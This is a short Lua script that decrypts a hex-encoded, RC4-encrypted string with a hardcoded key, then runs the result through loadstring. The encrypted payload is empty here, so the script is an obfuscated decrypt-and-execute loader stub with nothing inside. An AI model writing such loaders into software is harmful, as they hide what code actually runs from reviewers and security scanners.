local function bxor(a,b) local r=0 local p=1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+p end a=math.floor(a/2) b=math.floor(b/2) p=p*2 end return r end local function rc4(dat,key) local S={} for i=0,255 do S[i]=i end local j=0 for i=0,255 do j=(j+S[i]+string.byte(key,(i%#key)+1))%256 S[i],S[j]=S[j],S[i] end local i=0 j=0 local out={} for n=1,#dat do i=(i+1)%256 j=(j+S[i])%256 S[i],S[j]=S[j],S[i] local K=S[(S[i]+S[j])%256] local b=string.byte(dat,n) out[n]=string.char(bxor(b,K)) end return table.concat(out) end local function hex_to_str(h) local t={} for i=1,#h,2 do local byte=tonumber(h:sub(i,i+1),16) t[#t+1]=string.char(byte) end return table.concat(t) end local k='FJGbjEyBBlITT6vH' local c='' local decoded=rc4(hex_to_str(c),k) local f=loadstring(decoded) return f()
